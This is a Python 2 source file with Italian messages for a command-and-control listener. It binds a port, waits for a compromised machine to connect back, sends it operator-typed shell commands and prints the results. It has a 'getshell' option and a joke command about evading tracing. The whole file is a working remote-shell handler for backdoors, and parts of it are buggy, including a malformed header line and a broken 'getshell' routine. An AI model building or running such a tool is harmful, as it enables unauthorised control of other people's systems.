#!/usr/bin/python2.7
# -*- coding: utf-8 -*-try:
import socket
import os
import random
import time
import subprocess
try:
    import pip
except:
    os.system('sudo apt-get install python-pip -y')
if os.getuid() != 0:
    print "\033[1;31mYou Need To Be Root!\033[1;31m"
    exit()
try:
    from termcolor import colored
except:
    pip.main(['install', 'termcolor'])
    from termcolor import colored

def error(text):
    print(colored("[Errore] ", 'red',attrs=['bold'])+colored("{}".format(text), 'white'))
def info(text):
    print(colored("[Info] ", 'blue',attrs=['bold'])+colored("{}".format(text), 'white'))
def ricevi(text):
    print(colored("[++++] ", 'green',attrs=['bold'])+colored("{}".format(text), 'white'))

connections = 0
def start(server,port):
    global back
    global createshell
    global connection
    global address
    global connections
    back = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    try:
        back.bind((str(server),int(port)))
        back.listen(2)
        print ""
        info("Listener avviato -> {}:{}".format(server,port))
        connection, address = back.accept()
        info("Connessione in arrivo da {}!".format(address[0]))
        connections += 1
        createshell = connection.recv(1024)
    except:
        error("Non posso avviare il listener, controlla che host e porta siano liberi ed esistenti!")
        exit()
def c2(server):
    FNULL = open(os.devnull, 'w')
    global back
    global createshell
    global connection
    global address
    global connections
    if connections == 0:
        error("Nessuna connessione in arrivo, vado a dormire..")
        back.close()
        time.sleep(1)
        pass
    else:
        while 1:
            commands = raw_input(colored("[Shell] ", 'yellow')+colored(address[0], 'white')+colored("@", 'yellow')+colored(createshell,'white')+ ": ")
            if commands == 'quit' or commands == 'exit' or commands == 'q' or commands == 'e' or commands == 'QUIT' or commands == 'EXIT' or commands == 'Q' or commands == 'E':
                info("Chiudo tutte le sessioni...")
                back.close()
                exit()
            elif commands == 'getshell' or commands == '7':
                try:
                    info("Provo ad aprire un terminale remoto")
                    shell = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    shell.bind((server,8887))
                    shell.listen(2)
                    conn,add = shell.accept()
                    connectedd = shell.recv(1024)
                    if connectedd == 0:
                        shell.close()
                    else:
                        while 1:
                            shell.recv(1022)
                except:
                    raise
            elif commands == 'staccah':
                error("TI STANNO TRACCIANDO, STACCAHH!!!")
                time.sleep(1)
                error("SEI ANCORA QUA'? STACCAHH PRESTOOOOOOH!!!")
                time.sleep(1)
            execute = connection.sendall(commands)
            out = connection.recv(1000000)
            if out <> createshell:
                ricevi(out)
def startall(server,port):
    try:
        start(server,port)
        c2(server)
    except KeyboardInterrupt:
        print ""
        error("CTRL + C, Addio...")
        time.sleep(1)
        exit()
